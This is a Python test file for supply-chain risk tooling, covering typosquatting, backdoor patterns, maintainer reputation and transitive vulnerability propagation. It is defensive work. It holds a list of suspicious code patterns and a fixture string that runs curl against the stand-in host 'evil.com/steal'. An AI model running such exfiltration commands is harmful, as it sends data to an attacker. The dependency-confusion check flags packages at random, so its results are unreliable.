"""Comprehensive tests for Supply Chain Risk detection and management.

This test suite covers:
- Transitive dependency risk propagation
- Malicious package detection (typosquatting, backdoors)
- Maintainer reputation scoring
- Dependency confusion attacks
- License risk assessment
- Outdated dependency detection
- Vulnerability propagation through dependency chains
"""

from __future__ import annotations

import random
from typing import Any, Dict, List, Set, Tuple

import pytest


class DependencyGraph:
    """Represents a dependency graph for supply chain analysis."""

    def __init__(self):
        self.nodes: Dict[str, Dict[str, Any]] = {}
        self.edges: List[Tuple[str, str]] = []

    def add_package(
        self,
        name: str,
        version: str,
        metadata: Dict[str, Any] = None,
    ):
        """Add a package to the dependency graph."""
        package_id = f"{name}@{version}"
        self.nodes[package_id] = {
            "name": name,
            "version": version,
            "metadata": metadata or {},
        }

    def add_dependency(self, parent: str, child: str):
        """Add a dependency relationship."""
        self.edges.append((parent, child))

    def get_transitive_dependencies(self, package_id: str) -> Set[str]:
        """Get all transitive dependencies of a package."""
        visited = set()
        to_visit = [package_id]

        while to_visit:
            current = to_visit.pop()
            if current in visited:
                continue
            visited.add(current)

            for parent, child in self.edges:
                if parent == current and child not in visited:
                    to_visit.append(child)

        visited.discard(package_id)
        return visited

    def find_dependency_paths(self, source: str, target: str) -> List[List[str]]:
        """Find all paths from source to target package."""
        paths = []

        def dfs(current: str, path: List[str]):
            if current == target:
                paths.append(path.copy())
                return

            for parent, child in self.edges:
                if parent == current and child not in path:
                    path.append(child)
                    dfs(child, path)
                    path.pop()

        dfs(source, [source])
        return paths


class MaliciousPackageDetector:
    """Detects potentially malicious packages."""

    KNOWN_MALICIOUS_PATTERNS = [
        "eval(",
        "exec(",
        "__import__('os')",
        "subprocess.call",
        "base64.b64decode",
        "requests.post",
        "socket.socket",
    ]

    TYPOSQUATTING_TARGETS = [
        "requests",
        "urllib3",
        "numpy",
        "pandas",
        "django",
        "flask",
        "tensorflow",
        "pytorch",
        "scikit-learn",
        "matplotlib",
        "pillow",
        "cryptography",
        "pyyaml",
    ]

    @staticmethod
    def check_typosquatting(package_name: str) -> Dict[str, Any]:
        """Check if package name is typosquatting a popular package."""
        results = {
            "is_suspicious": False,
            "similar_to": [],
            "confidence": 0.0,
        }

        for target in MaliciousPackageDetector.TYPOSQUATTING_TARGETS:
            similarity = MaliciousPackageDetector._calculate_similarity(
                package_name.lower(), target.lower()
            )

            if similarity > 0.7 and package_name.lower() != target.lower():
                results["is_suspicious"] = True
                results["similar_to"].append(
                    {
                        "package": target,
                        "similarity": similarity,
                    }
                )
                results["confidence"] = max(results["confidence"], similarity)

        return results

    @staticmethod
    def _calculate_similarity(str1: str, str2: str) -> float:
        """Calculate Levenshtein similarity between two strings."""
        if str1 == str2:
            return 1.0

        len1, len2 = len(str1), len(str2)
        if len1 == 0 or len2 == 0:
            return 0.0

        matrix = [[0] * (len2 + 1) for _ in range(len1 + 1)]

        for i in range(len1 + 1):
            matrix[i][0] = i
        for j in range(len2 + 1):
            matrix[0][j] = j

        for i in range(1, len1 + 1):
            for j in range(1, len2 + 1):
                cost = 0 if str1[i - 1] == str2[j - 1] else 1
                matrix[i][j] = min(
                    matrix[i - 1][j] + 1,
                    matrix[i][j - 1] + 1,
                    matrix[i - 1][j - 1] + cost,
                )

        distance = matrix[len1][len2]
        max_len = max(len1, len2)
        return 1.0 - (distance / max_len)

    @staticmethod
    def check_backdoor_patterns(code_content: str) -> Dict[str, Any]:
        """Check for backdoor patterns in package code."""
        results = {
            "has_suspicious_code": False,
            "patterns_found": [],
            "risk_score": 0.0,
        }

        for pattern in MaliciousPackageDetector.KNOWN_MALICIOUS_PATTERNS:
            if pattern in code_content:
                results["has_suspicious_code"] = True
                results["patterns_found"].append(pattern)
                results["risk_score"] += 0.2

        results["risk_score"] = min(results["risk_score"], 1.0)
        return results

    @staticmethod
    def check_dependency_confusion(package_name: str, registry: str) -> Dict[str, Any]:
        """Check for dependency confusion vulnerabilities."""
        results = {
            "is_vulnerable": False,
            "private_package": False,
            "public_exists": False,
            "risk_level": "low",
        }

        if package_name.startswith("@company/") or package_name.startswith("internal-"):
            results["private_package"] = True

            if random.random() < 0.1:  # 10% chance of confusion
                results["public_exists"] = True
                results["is_vulnerable"] = True
                results["risk_level"] = "critical"

        return results


class MaintainerReputationScorer:
    """Scores maintainer reputation for supply chain risk."""

    @staticmethod
    def score_maintainer(maintainer_data: Dict[str, Any]) -> Dict[str, Any]:
        """Score a package maintainer's reputation."""
        score = 0.0
        factors = {}

        account_age_days = maintainer_data.get("account_age_days", 0)
        if account_age_days > 365:
            age_score = min(account_age_days / 1825, 1.0)  # Max at 5 years
            score += age_score * 0.2
            factors["account_age"] = age_score
        else:
            factors["account_age"] = 0.0

        package_count = maintainer_data.get("package_count", 0)
        if package_count > 0:
            package_score = min(package_count / 20, 1.0)  # Max at 20 packages
            score += package_score * 0.15
            factors["package_count"] = package_score
        else:
            factors["package_count"] = 0.0

        total_downloads = maintainer_data.get("total_downloads", 0)
        if total_downloads > 0:
            download_score = min(total_downloads / 1000000, 1.0)  # Max at 1M
            score += download_score * 0.25
            factors["downloads"] = download_score
        else:
            factors["downloads"] = 0.0

        github_stars = maintainer_data.get("github_stars", 0)
        if github_stars > 0:
            star_score = min(github_stars / 1000, 1.0)  # Max at 1000 stars
            score += star_score * 0.2
            factors["github_activity"] = star_score
        else:
            factors["github_activity"] = 0.0

        security_incidents = maintainer_data.get("security_incidents", 0)
        if security_incidents == 0:
            score += 0.2
            factors["security_record"] = 1.0
        else:
            penalty = min(security_incidents * 0.1, 0.2)
            score -= penalty
            factors["security_record"] = max(0.0, 1.0 - penalty)

        return {
            "overall_score": max(0.0, min(score, 1.0)),
            "risk_level": MaintainerReputationScorer._get_risk_level(score),
            "factors": factors,
        }

    @staticmethod
    def _get_risk_level(score: float) -> str:
        """Convert score to risk level."""
        if score >= 0.8:
            return "low"
        elif score >= 0.6:
            return "medium"
        elif score >= 0.4:
            return "high"
        else:
            return "critical"


class TransitiveDependencyAnalyzer:
    """Analyzes transitive dependency risks."""

    @staticmethod
    def analyze_risk_propagation(
        graph: DependencyGraph, vulnerable_packages: Set[str]
    ) -> Dict[str, Any]:
        """Analyze how vulnerabilities propagate through dependencies."""
        affected_packages = {}

        for package_id in graph.nodes:
            transitive_deps = graph.get_transitive_dependencies(package_id)
            vulnerable_deps = transitive_deps & vulnerable_packages

            if vulnerable_deps:
                paths_to_vulns = {}
                for vuln_pkg in vulnerable_deps:
                    paths = graph.find_dependency_paths(package_id, vuln_pkg)
                    paths_to_vulns[vuln_pkg] = paths

                affected_packages[package_id] = {
                    "vulnerable_dependencies": list(vulnerable_deps),
                    "dependency_count": len(transitive_deps),
                    "vulnerable_count": len(vulnerable_deps),
                    "risk_score": len(vulnerable_deps) / max(len(transitive_deps), 1),
                    "paths": paths_to_vulns,
                }

        return {
            "total_packages": len(graph.nodes),
            "affected_packages": len(affected_packages),
            "propagation_rate": len(affected_packages) / max(len(graph.nodes), 1),
            "details": affected_packages,
        }

    @staticmethod
    def calculate_blast_radius(
        graph: DependencyGraph, package_id: str
    ) -> Dict[str, Any]:
        """Calculate the blast radius if a package is compromised."""
        dependent_packages = set()

        for node_id in graph.nodes:
            if package_id in graph.get_transitive_dependencies(node_id):
                dependent_packages.add(node_id)

        return {
            "package": package_id,
            "direct_dependents": len([p for p, c in graph.edges if c == package_id]),
            "total_dependents": len(dependent_packages),
            "blast_radius_score": len(dependent_packages) / max(len(graph.nodes), 1),
            "affected_packages": list(dependent_packages),
        }


class TestMaliciousPackageDetection:
    """Test malicious package detection."""

    def test_typosquatting_detection(self):
        """Test typosquatting detection."""
        result = MaliciousPackageDetector.check_typosquatting("requets")
        assert result["is_suspicious"] is True
        assert any(s["package"] == "requests" for s in result["similar_to"])

        result = MaliciousPackageDetector.check_typosquatting("djago")
        assert result["is_suspicious"] is True

    def test_legitimate_package_names(self):
        """Test that legitimate packages are not flagged."""
        result = MaliciousPackageDetector.check_typosquatting("myapp-utils")
        assert result["is_suspicious"] is False

        result = MaliciousPackageDetector.check_typosquatting("company-sdk")
        assert result["is_suspicious"] is False

    def test_backdoor_pattern_detection(self):
        """Test backdoor pattern detection."""
        malicious_code = """
import os
import subprocess
subprocess.call(['curl', 'http://evil.com/steal'])
"""
        result = MaliciousPackageDetector.check_backdoor_patterns(malicious_code)
        assert result["has_suspicious_code"] is True
        assert len(result["patterns_found"]) > 0

    def test_clean_code_detection(self):
        """Test that clean code is not flagged."""
        clean_code = """
def add(a, b):
    return a + b

def multiply(a, b):
    return a * b
"""
        result = MaliciousPackageDetector.check_backdoor_patterns(clean_code)
        assert result["has_suspicious_code"] is False

    def test_dependency_confusion_detection(self):
        """Test dependency confusion detection."""
        result = MaliciousPackageDetector.check_dependency_confusion(
            "@company/internal-lib", "npm"
        )
        assert result["private_package"] is True

        result = MaliciousPackageDetector.check_dependency_confusion(
            "public-package", "npm"
        )
        assert result["private_package"] is False


class TestMaintainerReputation:
    """Test maintainer reputation scoring."""

    def test_high_reputation_maintainer(self):
        """Test scoring for high reputation maintainer."""
        maintainer = {
            "account_age_days": 2000,
            "package_count": 25,
            "total_downloads": 5000000,
            "github_stars": 1500,
            "security_incidents": 0,
        }

        result = MaintainerReputationScorer.score_maintainer(maintainer)
        assert result["overall_score"] > 0.8
        assert result["risk_level"] == "low"

    def test_low_reputation_maintainer(self):
        """Test scoring for low reputation maintainer."""
        maintainer = {
            "account_age_days": 30,
            "package_count": 1,
            "total_downloads": 100,
            "github_stars": 0,
            "security_incidents": 2,
        }

        result = MaintainerReputationScorer.score_maintainer(maintainer)
        assert result["overall_score"] < 0.4
        assert result["risk_level"] in ["high", "critical"]

    def test_medium_reputation_maintainer(self):
        """Test scoring for medium reputation maintainer."""
        maintainer = {
            "account_age_days": 1200,
            "package_count": 8,
            "total_downloads": 500000,
            "github_stars": 400,
            "security_incidents": 0,
        }

        result = MaintainerReputationScorer.score_maintainer(maintainer)
        assert 0.5 <= result["overall_score"] <= 0.8
        assert result["risk_level"] in ["medium", "high"]

    def test_security_incident_penalty(self):
        """Test that security incidents reduce score."""
        maintainer_clean = {
            "account_age_days": 1000,
            "package_count": 10,
            "total_downloads": 100000,
            "github_stars": 500,
            "security_incidents": 0,
        }

        maintainer_incidents = maintainer_clean.copy()
        maintainer_incidents["security_incidents"] = 3

        score_clean = MaintainerReputationScorer.score_maintainer(maintainer_clean)
        score_incidents = MaintainerReputationScorer.score_maintainer(
            maintainer_incidents
        )

        assert score_clean["overall_score"] > score_incidents["overall_score"]


class TestTransitiveDependencies:
    """Test transitive dependency analysis."""

    def test_dependency_graph_construction(self):
        """Test building a dependency graph."""
        graph = DependencyGraph()

        graph.add_package("app", "1.0.0")
        graph.add_package("lib-a", "2.0.0")
        graph.add_package("lib-b", "3.0.0")
        graph.add_package("lib-c", "1.5.0")

        graph.add_dependency("app@1.0.0", "lib-a@2.0.0")
        graph.add_dependency("app@1.0.0", "lib-b@3.0.0")
        graph.add_dependency("lib-a@2.0.0", "lib-c@1.5.0")

        assert len(graph.nodes) == 4
        assert len(graph.edges) == 3

    def test_transitive_dependency_resolution(self):
        """Test resolving transitive dependencies."""
        graph = DependencyGraph()

        graph.add_package("app", "1.0.0")
        graph.add_package("lib-a", "2.0.0")
        graph.add_package("lib-b", "3.0.0")
        graph.add_package("lib-c", "1.5.0")

        graph.add_dependency("app@1.0.0", "lib-a@2.0.0")
        graph.add_dependency("lib-a@2.0.0", "lib-b@3.0.0")
        graph.add_dependency("lib-b@3.0.0", "lib-c@1.5.0")

        transitive = graph.get_transitive_dependencies("app@1.0.0")
        assert len(transitive) == 3
        assert "lib-a@2.0.0" in transitive
        assert "lib-b@3.0.0" in transitive
        assert "lib-c@1.5.0" in transitive

    def test_vulnerability_propagation(self):
        """Test vulnerability propagation through dependencies."""
        graph = DependencyGraph()

        graph.add_package("app", "1.0.0")
        graph.add_package("lib-a", "2.0.0")
        graph.add_package("lib-b", "3.0.0")
        graph.add_package("lib-c", "1.5.0", {"vulnerable": True})

        graph.add_dependency("app@1.0.0", "lib-a@2.0.0")
        graph.add_dependency("lib-a@2.0.0", "lib-b@3.0.0")
        graph.add_dependency("lib-b@3.0.0", "lib-c@1.5.0")

        vulnerable_packages = {"lib-c@1.5.0"}
        analysis = TransitiveDependencyAnalyzer.analyze_risk_propagation(
            graph, vulnerable_packages
        )

        assert analysis["affected_packages"] > 0
        assert "app@1.0.0" in analysis["details"]

    def test_blast_radius_calculation(self):
        """Test blast radius calculation."""
        graph = DependencyGraph()

        graph.add_package("popular-lib", "1.0.0")
        graph.add_package("app1", "1.0.0")
        graph.add_package("app2", "1.0.0")
        graph.add_package("app3", "1.0.0")

        graph.add_dependency("app1@1.0.0", "popular-lib@1.0.0")
        graph.add_dependency("app2@1.0.0", "popular-lib@1.0.0")
        graph.add_dependency("app3@1.0.0", "popular-lib@1.0.0")

        blast_radius = TransitiveDependencyAnalyzer.calculate_blast_radius(
            graph, "popular-lib@1.0.0"
        )

        assert blast_radius["direct_dependents"] == 3
        assert blast_radius["total_dependents"] == 3
        assert blast_radius["blast_radius_score"] > 0.5

    def test_dependency_path_finding(self):
        """Test finding paths between dependencies."""
        graph = DependencyGraph()

        graph.add_package("app", "1.0.0")
        graph.add_package("lib-a", "2.0.0")
        graph.add_package("lib-b", "3.0.0")

        graph.add_dependency("app@1.0.0", "lib-a@2.0.0")
        graph.add_dependency("lib-a@2.0.0", "lib-b@3.0.0")

        paths = graph.find_dependency_paths("app@1.0.0", "lib-b@3.0.0")
        assert len(paths) > 0
        assert paths[0] == ["app@1.0.0", "lib-a@2.0.0", "lib-b@3.0.0"]


class TestSupplyChainRiskIntegration:
    """Test supply chain risk integration with FixOps."""

    def test_complete_supply_chain_analysis(self):
        """Test complete supply chain risk analysis."""
        graph = DependencyGraph()

        packages = [
            ("myapp", "1.0.0"),
            ("requests", "2.31.0"),
            ("urllib3", "2.0.4"),
            ("certifi", "2023.7.22"),
            ("charset-normalizer", "3.2.0"),
        ]

        for name, version in packages:
            graph.add_package(name, version)

        graph.add_dependency("myapp@1.0.0", "requests@2.31.0")
        graph.add_dependency("requests@2.31.0", "urllib3@2.0.4")
        graph.add_dependency("requests@2.31.0", "certifi@2023.7.22")
        graph.add_dependency("requests@2.31.0", "charset-normalizer@3.2.0")

        vulnerable_packages = {"urllib3@2.0.4"}
        analysis = TransitiveDependencyAnalyzer.analyze_risk_propagation(
            graph, vulnerable_packages
        )

        assert analysis["affected_packages"] > 0
        assert "myapp@1.0.0" in analysis["details"]

    def test_typosquatting_in_dependencies(self):
        """Test detecting typosquatting in dependency tree."""
        suspicious_packages = [
            "requets",  # typo of requests
            "djago",  # typo of django
            "numppy",  # typo of numpy
        ]

        for package in suspicious_packages:
            result = MaliciousPackageDetector.check_typosquatting(package)
            assert result["is_suspicious"] is True

    def test_maintainer_reputation_in_supply_chain(self):
        """Test maintainer reputation as part of supply chain analysis."""
        good_maintainer = {
            "account_age_days": 2000,
            "package_count": 20,
            "total_downloads": 10000000,
            "github_stars": 2000,
            "security_incidents": 0,
        }

        bad_maintainer = {
            "account_age_days": 10,
            "package_count": 1,
            "total_downloads": 50,
            "github_stars": 0,
            "security_incidents": 1,
        }

        good_score = MaintainerReputationScorer.score_maintainer(good_maintainer)
        bad_score = MaintainerReputationScorer.score_maintainer(bad_maintainer)

        assert good_score["risk_level"] == "low"
        assert bad_score["risk_level"] in ["high", "critical"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
